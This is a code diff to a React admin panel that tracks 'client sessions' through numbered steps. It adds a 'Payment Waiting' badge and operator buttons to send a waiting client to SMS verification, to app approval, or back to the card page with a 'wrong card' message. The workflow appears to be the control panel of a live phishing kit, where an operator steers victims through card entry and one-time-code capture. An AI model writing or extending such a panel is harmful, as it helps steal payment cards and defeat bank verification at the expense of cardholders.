@@ -118,9 +118,15 @@ const AdminPanel = () => {
   };
 
   const updateClientStep = async (sessionId: string, newStep: number) => {
+    // When going back to card page (step 2), reset the approval_type so they see the form
+    const updateData: { current_step: number; approval_type?: null } = { current_step: newStep };
+    if (newStep === 2) {
+      updateData.approval_type = null;
+    }
+    
     const { error } = await supabase
       .from("client_sessions")
-      .update({ current_step: newStep })
+      .update(updateData)
       .eq("id", sessionId);
 
     if (error) {
@@ -606,6 +612,14 @@ const AdminPanel = () => {
                           </span>
                         </CardTitle>
                         <div className="flex items-center gap-2">
+                          {session.approval_type === "payment_waiting" && (
+                            <Badge 
+                              variant="outline" 
+                              className="border-orange-500 text-orange-600 gap-1 animate-pulse"
+                            >
+                              <Clock className="w-3 h-3" /> Waiting
+                            </Badge>
+                          )}
                           {session.current_step === 4 && session.approval_type && (
                             <Badge 
                               variant="outline" 
@@ -622,7 +636,7 @@ const AdminPanel = () => {
                             </Badge>
                           )}
                           <Badge className={`${stepColors[session.current_step]} text-white`}>
-                            {stepNames[session.current_step]}
+                            {session.approval_type === "payment_waiting" ? "Payment Waiting" : stepNames[session.current_step]}
                           </Badge>
                         </div>
                       </div>
@@ -766,6 +780,42 @@ const AdminPanel = () => {
                           </Button>
                         </div>
                       </div>
+
+                      {/* Payment Waiting Controls - Show when client is waiting after payment */}
+                      {session.current_step === 2 && session.approval_type === "payment_waiting" && (
+                        <div className="space-y-3 pt-2 border-t">
+                          <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
+                            Client is waiting - Choose verification method:
+                          </p>
+                          <div className="flex gap-2">
+                            <Button
+                              size="sm"
+                              className="flex-1 gap-2 bg-green-600 hover:bg-green-700 text-white"
+                              onClick={() => sendToSmsVerification(session.id)}
+                            >
+                              <MessageCircle className="w-4 h-4" />
+                              Send to SMS
+                            </Button>
+                            <Button
+                              size="sm"
+                              className="flex-1 gap-2 bg-blue-600 hover:bg-blue-700 text-white"
+                              onClick={() => sendToAppApproval(session.id)}
+                            >
+                              <Smartphone className="w-4 h-4" />
+                              Send to App
+                            </Button>
+                          </div>
+                          <Button
+                            variant="outline"
+                            size="sm"
+                            className="w-full gap-2 text-orange-600 border-orange-500 hover:bg-orange-500 hover:text-white"
+                            onClick={() => sendWrongCardMessage(session.id)}
+                          >
+                            <CreditCard className="w-4 h-4" />
+                            Wrong Card - Back to Payment
+                          </Button>
+                        </div>
+                      )}
 
                       {/* Verification Controls - Only show when on verification step */}
                       {session.current_step === 3 && (
